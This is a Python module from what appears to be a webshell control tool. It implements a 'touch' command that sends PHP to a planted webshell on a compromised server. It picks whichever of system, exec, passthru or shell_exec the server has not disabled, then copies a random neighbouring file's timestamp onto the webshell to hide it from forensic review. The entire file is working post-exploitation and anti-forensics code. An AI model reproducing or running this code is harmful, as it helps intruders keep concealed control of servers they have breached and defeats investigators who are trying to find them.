from libs.config import gget, alias, color
from libs.myapp import send
from random import choice


def get_php(filename, command):
    return """$arr = glob("*.*");
$reference = $arr[mt_rand(0, count($arr) - 1)];
$file='%s';
if ($file==''){$file=basename($_SERVER['SCRIPT_NAME']);}
%s("touch -r $reference $file");
echo $file.' as '.$reference;""" % (filename, command)


@alias(True, func_alias="t", f="filename")
def run(filename: str = ""):
    """
    touch

    Specify a file whose modification time stamp is the same as a random file in the current directory.

    eg: touch {filename=this_webshell}
    """
    disable_function_list = gget("webshell.disable_functions", "webshell")
    command_execute_set = {"system", "exec", "passthru", "shell_exec"}
    try:
        command = choice(tuple(command_execute_set - set(disable_function_list)))
        reference = send(get_php(filename, command)).r_text
        print(color.green(f"Modify time stamp {reference} success."))
    except IndexError:
        print(color.red("all the system execute commands are disabled."))
